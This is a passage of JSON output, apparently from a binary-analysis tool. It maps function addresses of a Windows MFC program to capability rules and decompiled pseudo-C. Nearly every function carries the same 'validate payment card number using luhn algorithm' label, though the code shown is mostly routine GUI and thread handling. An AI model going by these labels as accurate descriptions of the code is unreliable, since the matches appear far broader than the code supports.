        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00424c81(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWinApp.0;\n    piVar1 = extraout_ECX[0x16];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))(1);\n    }\n    if (extraout_ECX[0x22] != NULL) {\n        (**(*extraout_ECX[0x22] + 0x18))(1);\n    }\n    iVar3 = fcn.0043026e();\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*0x4bb204 != NULL) {\n            (**(**0x4bb204 + 4))(1);\n            *0x4bb204 = NULL;\n        }\n        if (*0x4bb200 != NULL) {\n            (**(**0x4bb200 + 4))(1);\n            *0x4bb200 = NULL;\n        }\n    }\n    if (extraout_ECX[0x1c] != NULL) {\n        fcn.004304e4(extraout_ECX[0x1c]);\n    }\n    if (extraout_ECX[0x1d] != NULL) {\n        fcn.004304e4(extraout_ECX[0x1d]);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    if (*(extraout_ECX + 0x24) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(*(extraout_ECX + 0x24));\n    }\n    if (*(extraout_ECX + 0x92) != 0) {\n        (*pcVar2)(*(extraout_ECX + 0x92));\n    }\n    if (extraout_ECX[0x23] != NULL) {\n        (**(*extraout_ECX[0x23] + 4))(1);\n    }\n    iVar3 = fcn.0043026e();\n    if (*(iVar3 + 0x10) == extraout_ECX[0x14]) {\n        *(iVar3 + 0x10) = 0;\n    }\n    if (*(iVar3 + 4) == extraout_ECX) {\n        *(iVar3 + 4) = 0;\n    }\n    fcn.0045e756(extraout_ECX[0x14]);\n    fcn.0045e756(extraout_ECX[0x15]);\n    fcn.0045e756(extraout_ECX[0x18]);\n    fcn.0045e756(extraout_ECX[0x19]);\n    fcn.0045e756(extraout_ECX[0x1a]);\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[0xb] = NULL;\n    fcn.00426a48();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 759
    },
    "00424fd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424fd8(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00463e16(param_1, param_2, param_3);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 71
    },
    "00426240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426240(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043026e();\n    if (*(iVar1 + 4) != NULL) {\n    // WARNING: Could not recover jumptable at 0x00426254. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(iVar1 + 4) + 0x98))();\n        return;\n    }\n    fcn.004260e5(0, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 143
    },
    "0042654e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042654e(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    \n    arg_8h_00 = fcn.0040f8a0(arg_10h + arg_18h);\n    fcn.0045f3a0(arg_8h_00, arg_10h, arg_ch, arg_10h);\n    fcn.0045f3a0(arg_8h_00 + arg_10h, arg_18h, arg_14h, arg_18h);\n    fcn.0040f8d0(arg_10h + arg_18h);\n    return;\n}\n",
        "token_count": 174
    },
    "00426a11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426a11(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x24) = 0;\n    *(param_1 + 0x2c) = 0;\n    *(param_1 + 0x30) = 0;\n    iVar1 = fcn.0042fcbb();\n    *(iVar1 + 0x34) = 0;\n    *(iVar1 + 0x54) = 0;\n    (*_sym.imp.USER32.dll_GetCursorPos)(iVar1 + 0x4c);\n    *(param_1 + 0x40) = 0;\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x28) = 1;\n    return;\n}\n",
        "token_count": 199
    },
    "00426b37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00426b37(int32_t *param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint arg_14h;\n    \n    ppcVar1 = (**(*param_1 + 0x28))();\n    pcVar3 = *ppcVar1;\n    do {\n        if (pcVar3 == NULL) {\n            return 0;\n        }\n        arg_14h = 0;\n        if (*(param_2 + 4) < 0xc000) {\n            iVar2 = fcn.0041619b(ppcVar1[1], *(param_2 + 4), 0, 0);\n            if (iVar2 != 0) {\ncode_r0x00426b6c:\n                (**(iVar2 + 0x14))(*(param_2 + 8), *(param_2 + 0xc));\n                return 1;\n            }\n        }\n        else {\n            pcVar3 = ppcVar1[1];\n            while (iVar2 = fcn.0041619b(pcVar3, 0xc000, 0, arg_14h),  iVar2 != 0) {\n                if (**(iVar2 + 0x10) == *(param_2 + 4)) goto code_r0x00426b6c;\n                pcVar3 = iVar2 + 0x18;\n            }\n        }\n        ppcVar1 = (**ppcVar1)();\n        pcVar3 = *ppcVar1;\n    } while( true );\n}\n",
        "token_count": 354
    },
    "004270b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.004270b2(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    if (param_2 < 1) {\n        iVar3 = *(param_1 + 0x20);\n        if (((iVar3 != 0) && (*(iVar3 + 0x20) != 0)) &&\n           (iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x20)),  iVar1 != 0)) {\n            fcn.00418eb5(iVar3, *(iVar3 + 0x20), 0x363, 1, 0);\n            fcn.004191c1(*(iVar3 + 0x20), 0x363, 1, 0, 1, 1);\n        }\n        fcn.0043026e();\n        iVar1 = fcn.00421627();\n        for (iVar1 = *(iVar1 + 8); iVar1 != 0; iVar1 = *(iVar1 + 0x6c)) {\n            if ((*(iVar1 + 0x20) != 0) && (iVar1 != iVar3)) {\n                if (*(iVar1 + 0xa0) == 0) {\n                    fcn.0041bf7a(0);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x20));\n                if ((iVar2 != 0) || (-1 < *(iVar1 + 0xa0))) {\n                    fcn.00418eb5(iVar1, *(iVar1 + 0x20), 0x363, 1, 0);\n                    fcn.004191c1(*(iVar1 + 0x20), 0x363, 1, 0, 1, 1);\n                }\n                if (0 < *(iVar1 + 0xa0)) {\n                    fcn.0041bf7a();\n                }\n                *(iVar1 + 0xa0) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        fcn.0043026e();\n        iVar3 = fcn.00421627();\n        if (*(iVar3 + 0x10) == 0) {\n            fcn.00432b33();\n            fcn.00432da4(1);\n        }\n    }\n    return unaff_retaddr < 0;\n}\n",
        "token_count": 553
    },
    "004272c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004272c5(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t hHandle;\n    int32_t hEvent;\n    int32_t var_4h;\n    \n    if (*(in_ECX + 0x2c) != 0) {\n        fcn.00411e42();\n    }\n    fcn.00462290(&var_1ch, 0, 0x1c);\n    var_1ch = fcn.0042fcbb();\n    pcVar1 = _sym.imp.KERNEL32.dll_CreateEventA;\n    hHandle = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n    hEvent = (*pcVar1)(0, 1, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    var_14h = arg_8h;\n    if (hHandle != 0) {\n        if (hEvent != 0) {\n            iVar2 = fcn.004640ad(arg_10h, arg_ch, 0x4271ad, &var_1ch, arg_8h | 4, in_ECX + 0x30);\n            *(in_ECX + 0x2c) = iVar2;\n            if (iVar2 == 0) {\n                return 0;\n            }\n            (*_sym.imp.KERNEL32.dll_ResumeThread)(iVar2);\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 0xffffffff);\n            (*pcVar1)(hHandle);\n            if ((arg_8h & 4) != 0) {\n                (*_sym.imp.KERNEL32.dll_SuspendThread)(*(in_ECX + 0x2c));\n            }\n            if (var_4h == 0) {\n                (*_sym.imp.KERNEL32.dll_SetEvent)(hEvent);\n                return 1;\n            }\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(in_ECX + 0x2c), 0xffffffff);\n            (*pcVar1)(*(in_ECX + 0x2c));\n            *(in_ECX + 0x2c) = 0;\n            goto code_r0x004273a4;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hHandle);\n    }\n    if (hEvent == 0) {\n        return 0;\n    }\ncode_r0x004273a4:\n    (*pcVar1)(hEvent);\n    return 0;\n}\n",
        "token_count": 611
    },
    "004287c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004287c2(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    if (0x7fffffff - param_2 < param_3) {\n        return 0x80070057;\n    }\n    *param_1 = param_2 + param_3;\n    return 0;\n}\n",
        "token_count": 80
    },
    "00428a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00428a10(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004287c2(&var_4h, arg_8h, arg_ch);\n    if (iVar1 < 0) {\n        fcn.00401280(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 93
    },
    "0042933f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042933f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    int64_t iVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_34h;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627e2(0x70);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    fcn.004292e0(0, 0xffffffff, 0);\n    iVar1 = *extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = (**(iVar1 + 0x84))(*(unaff_EBP + 8), 0x20, unaff_EBP + -0x34);\n    iVar1 = *extraout_ECX;\n    *(unaff_EBP + -0x18) = arg_8h_00;\n    if (arg_8h_00 == NULL) {\n        (**(iVar1 + 0x80))(*(unaff_EBP + 8), unaff_EBP + -0x34, 0, 0xf101);\n        *(unaff_EBP + -0x34) = vtable.CFileException.0;\n        fcn.00402740();\n    }\n    else {\n        (**(iVar1 + 0x6c))();\n        (**(*extraout_ECX + 0x5c))(1);\n        fcn.0042a2d4(arg_8h_00, 3, 0x1000, 0);\n        *(unaff_EBP + -0x7c) = extraout_ECX;\n        *(unaff_EBP + -0x78) = 0;\n        *(unaff_EBP + -4) = 2;\n        fcn.0043026e();\n        fcn.00411a16();\n        iVar1 = *arg_8h_00;\n        *(unaff_EBP + -4) = 3;\n        iVar2 = (**(iVar1 + 0x30))();\n        if (iVar2 != 0) {\n            (**(*extraout_ECX + 8))(unaff_EBP + -0x7c);\n        }\n        fcn.00429fc9();\n        (**(*extraout_ECX + 0x88))(arg_8h_00, 0);\n        *(unaff_EBP + -4) = 2;\n        fcn.0041b2a7();\n        iVar1 = *extraout_ECX;\n        *(unaff_EBP + -4) = 1;\n        (**(iVar1 + 0x5c))(0);\n        *(unaff_EBP + -4) = 0;\n        fcn.0042a214();\n        *(unaff_EBP + -0x34) = vtable.CFileException.0;\n        fcn.00402740();\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 784
    },
    "004294ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004294ba(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_7ch;\n    uint var_78h;\n    uint var_34h;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627e2(0x70);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    fcn.004292e0(0, 0xffffffff, 0);\n    iVar2 = *extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = (**(iVar2 + 0x84))(*(unaff_EBP + 8), 0x1012, unaff_EBP + -0x34);\n    *(unaff_EBP + -0x18) = iVar2;\n    if (iVar2 == 0) {\n        (**(*extraout_ECX + 0x80))(*(unaff_EBP + 8), unaff_EBP + -0x34, 1, 0xf100);\n        *(unaff_EBP + -0x34) = vtable.CFileException.0;\n        fcn.00402740();\n    }\n    else {\n        fcn.0042a2d4(iVar2, 2, 0x1000, 0);\n        *(unaff_EBP + -0x7c) = extraout_ECX;\n        *(unaff_EBP + -0x78) = 0;\n        *(unaff_EBP + -4) = 2;\n        fcn.0043026e();\n        fcn.00411a16();\n        iVar1 = *extraout_ECX;\n        *(unaff_EBP + -4) = 3;\n        (**(iVar1 + 8))(unaff_EBP + -0x7c);\n        fcn.00429fc9();\n        (**(*extraout_ECX + 0x88))(iVar2, 0);\n        *(unaff_EBP + -4) = 2;\n        fcn.0041b2a7();\n        iVar2 = *extraout_ECX;\n        *(unaff_EBP + -4) = 1;\n        (**(iVar2 + 0x5c))(0);\n        *(unaff_EBP + -4) = 0;\n        fcn.0042a214();\n        *(unaff_EBP + -0x34) = vtable.CFileException.0;\n        fcn.00402740();\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 686
    },
    "00429a2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00429a2a(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0045ef9e(param_1, param_2, param_3, param_4);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 82
    },
    "0042a658": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0042a658(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042fcbb();\n    param_1[1] = iVar1;\n    param_1[2] = *(iVar1 + 0xe8);\n    *param_1 = *(iVar1 + 0xe4);\n    *(iVar1 + 0xe4) = param_2;\n    *(param_1[1] + 0xe8) = param_1;\n    return param_1;\n}\n",
        "token_count": 129
    },
    "0042b3db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042b3db(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    \n    *(param_1 + 0x114) = param_2;\n    uVar1 = *(*(**(param_1 + 0x134) + 0x74) + 0x1e);\n    if (uVar1 < param_2) {\n        *(param_1 + 0x114) = uVar1;\n    }\n    uVar1 = *(*(**(param_1 + 0x134) + 0x74) + 0x1c);\n    if (*(param_1 + 0x114) < uVar1) {\n        *(param_1 + 0x114) = uVar1;\n    }\n    if (*(param_1 + 0x10c) == 0) {\n        fcn.004171b0(1, *(param_1 + 0x114), 1);\n    }\n    if (unaff_ESI != 0) {\n        uVar1 = 0;\n        if (*(param_1 + 0x110) != 0) {\n            iVar2 = 0;\n            do {\n                *(*(param_1 + 0xb0) + 0x18 + iVar2) = 0;\n                uVar1 = uVar1 + 1;\n                iVar2 = iVar2 + 0x28;\n            } while (uVar1 < *(param_1 + 0x110));\n        }\n    }\n    (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x20), 0, 1);\n    return;\n}\n",
        "token_count": 389
    },
    "0042beca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042beca(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    \n    pcVar3 = _sym.imp.USER32.dll_ShowScrollBar;\n    if (*(in_ECX + 0x10c) == 0) {\n        *(in_ECX + 0x118) = *(in_ECX + 0x108);\n        (*pcVar3)(*(in_ECX + 0x20), 0);\n        iVar4 = *(**(in_ECX + 0x134) + 0x74);\n        uVar2 = *(iVar4 + 0x1e);\n        if ((0x7fff < uVar2) || (arg_8h = 1,  0x7fff < uVar2 - *(iVar4 + 0x1c))) {\n            arg_8h = 0;\n        }\n        (*pcVar3)(*(in_ECX + 0x20), 1, arg_8h);\n        if (arg_8h != 0) {\n            var_18h = 3;\n            var_14h = *(*(**(in_ECX + 0x134) + 0x74) + 0x1c);\n            var_10h = *(*(**(in_ECX + 0x134) + 0x74) + 0x1e);\n            var_ch = 1;\n            iVar4 = fcn.004162ae(1, &var_1ch, 0);\n            if (iVar4 == 0) {\n                fcn.00417208(1, var_14h, var_10h, 0);\n            }\n        }\n        fcn.0042b3db(*(in_ECX + 0x114), 1);\n    }\n    else {\n        iVar4 = *(in_ECX + 0xb0);\n        iVar5 = arg_8h * 0x28;\n        *(in_ECX + 0x118) = 1;\n        *(iVar4 + 0x20) = *(iVar4 + 0x20 + iVar5);\n        *(iVar4 + 0x24) = *(iVar4 + 0x24 + iVar5);\n        iVar4 = *(in_ECX + 0xb0);\n        *(iVar4 + 0x10) = *(iVar4 + 0x10 + iVar5);\n        *(iVar4 + 0x14) = *(iVar4 + 0x14 + iVar5);\n        fcn.0042b3db(*(in_ECX + 0x114) + arg_8h, 0);\n        fcn.0042b110(0);\n        pcVar3 = _sym.imp.KERNEL32.dll_MulDiv;\n        puVar1 = iVar5 + 0x18 + *(in_ECX + 0xb0);\n        iVar4 = (*_sym.imp.KERNEL32.dll_MulDiv)(arg_ch, *puVar1, puVar1[1]);\n        iVar5 = (*pcVar3)(arg_10h, *puVar1, puVar1[1]);\n        fcn.00442382(iVar4 + **(in_ECX + 0xb0), iVar5 + (*(in_ECX + 0xb0))[1]);\n    }\n    return;\n}\n",
        "token_count": 801
    },
    "0042c801": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0042c801(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0043095b(0x42c690);\n    if (iVar1 != 0) goto code_r0x0042c83e;\n    fcn.00411e42();\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_PeekMessageA)(&stack0xffffffe0, 0, 0, 0, 0);\n        if (iVar2 == 0) break;\n        iVar2 = fcn.00426eda();\n        if (iVar2 == 0) {\n            return false;\n        }\ncode_r0x0042c83e:\n    } while (*(iVar1 + 4) == 0);\n    return *(iVar1 + 4) == 0;\n}\n",
        "token_count": 189
    },
    "0042da90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042da90(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_14h;\n    uint var_10h;\n    \n    fcn.00462290(&var_14h, 0, 0x14);\n    var_10h = arg_8h;\n    var_14h = 0x14;\n    (*_sym.imp.GDI32.dll_StartDocA)(*(in_ECX + 4), &var_14h);\n    return;\n}\n",
        "token_count": 115
    },
    "0042fdf9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042fdf9(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    fcn.00413f9d(0x496378);\n    *(unaff_EBP + -4) = 0;\n    fcn.0042fd77(unaff_EBP + -0x10);\n    fcn.00402740();\n    *extraout_ECX = vtable.CComCtlWrapper.0;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    extraout_ECX[0xb] = NULL;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    extraout_ECX[0xe] = NULL;\n    extraout_ECX[0xf] = NULL;\n    extraout_ECX[0x10] = NULL;\n    extraout_ECX[0x11] = NULL;\n    extraout_ECX[0x12] = NULL;\n    extraout_ECX[0x13] = NULL;\n    extraout_ECX[0x14] = NULL;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x16] = NULL;\n    extraout_ECX[0x17] = NULL;\n    extraout_ECX[0x18] = NULL;\n    extraout_ECX[0x19] = NULL;\n    extraout_ECX[0x1a] = NULL;\n    extraout_ECX[0x1b] = NULL;\n    extraout_ECX[0x1c] = NULL;\n    extraout_ECX[0x1d] = NULL;\n    extraout_ECX[0x1e] = NULL;\n    extraout_ECX[0x1f] = NULL;\n    extraout_ECX[0x20] = NULL;\n    extraout_ECX[0x21] = NULL;\n    extraout_ECX[0x22] = NULL;\n    extraout_ECX[0x23] = NULL;\n    extraout_ECX[0x24] = NULL;\n    extraout_ECX[0x25] = NULL;\n    extraout_ECX[0x26] = NULL;\n    extraout_ECX[0x27] = NULL;\n    extraout_ECX[0x28] = NULL;\n    extraout_ECX[0x29] = NULL;\n    extraout_ECX[0x2a] = NULL;\n    extraout_ECX[0x2b] = NULL;\n    extraout_ECX[0x2c] = NULL;\n    extraout_ECX[0x2d] = NULL;\n    extraout_ECX[0x2e] = NULL;\n    extraout_ECX[0x2f] = NULL;\n    extraout_ECX[0x30] = NULL;\n    extraout_ECX[0x31] = NULL;\n    extraout_ECX[0x32] = NULL;\n    extraout_ECX[0x33] = NULL;\n    extraout_ECX[0x34] = NULL;\n    extraout_ECX[0x35] = NULL;\n    extraout_ECX[0x36] = NULL;\n    extraout_ECX[0x37] = NULL;\n    extraout_ECX[0x38] = NULL;\n    extraout_ECX[0x39] = NULL;\n    extraout_ECX[0x3a] = NULL;\n    extraout_ECX[0x3b] = NULL;\n    extraout_ECX[0x3c] = NULL;\n    extraout_ECX[0x3d] = NULL;\n    extraout_ECX[0x3e] = NULL;\n    extraout_ECX[0x3f] = NULL;\n    extraout_ECX[0x40] = NULL;\n    extraout_ECX[0x41] = NULL;\n    extraout_ECX[0x42] = NULL;\n    extraout_ECX[0x43] = NULL;\n    extraout_ECX[0x44] = NULL;\n    extraout_ECX[0x45] = NULL;\n    extraout_ECX[0x46] = NULL;\n    extraout_ECX[0x47] = NULL;\n    extraout_ECX[0x48] = NULL;\n    extraout_ECX[0x49] = NULL;\n    extraout_ECX[0x4a] = NULL;\n    extraout_ECX[0x4b] = NULL;\n    extraout_ECX[0x4c] = NULL;\n    extraout_ECX[0x4d] = NULL;\n    extraout_ECX[0x4e] = NULL;\n    extraout_ECX[0x4f] = NULL;\n    extraout_ECX[0x50] = NULL;\n    extraout_ECX[0x51] = NULL;\n    extraout_ECX[0x52] = NULL;\n    extraout_ECX[0x53] = NULL;\n    extraout_ECX[0x54] = NULL;\n    extraout_ECX[0x55] = NULL;\n    extraout_ECX[0x56] = NULL;\n    extraout_ECX[0x57] = NULL;\n    extraout_ECX[0x58] = NULL;\n    extraout_ECX[0x59] = NULL;\n    extraout_ECX[0x5a] = NULL;\n    extraout_ECX[0x5b] = NULL;\n    extraout_ECX[0x5c] = NULL;\n    extraout_ECX[0x5d] = NULL;\n    extraout_ECX[0x5e] = NULL;\n    extraout_ECX[0x5f] = NULL;\n    extraout_ECX[0x60] = NULL;\n    extraout_ECX[0x61] = NULL;\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 1386
    },
    "0043003d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043003d(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    fcn.00413f9d(0x496390);\n    *(unaff_EBP + -4) = 0;\n    fcn.0042fd77(unaff_EBP + -0x10);\n    fcn.00402740();\n    *extraout_ECX = vtable.CCommDlgWrapper.0;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    extraout_ECX[0xb] = NULL;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    extraout_ECX[0xe] = NULL;\n    extraout_ECX[0xf] = NULL;\n    extraout_ECX[0x10] = NULL;\n    extraout_ECX[0x11] = NULL;\n    extraout_ECX[0x12] = NULL;\n    extraout_ECX[0x13] = NULL;\n    extraout_ECX[0x14] = NULL;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x16] = NULL;\n    extraout_ECX[0x17] = NULL;\n    extraout_ECX[0x18] = NULL;\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 407
    },
    "004302e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004302e1(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uStack8;\n    \n    fcn.0043026e();\n    iVar2 = fcn.00421627();\n    if (iVar2 == 0) {\n        uStack8 = 0x4b62b8;\n        fcn.0046230a(&uStack8, 0x4a76e8);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "0043040c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043040c(uint32_t param_1)\n\n{\n    if (0x10 < param_1) {\n        param_1 = fcn.00411e42();\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 * 0x18 + 0x4bb3e0);\n    return;\n}\n",
        "token_count": 79
    },
    "0043042c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
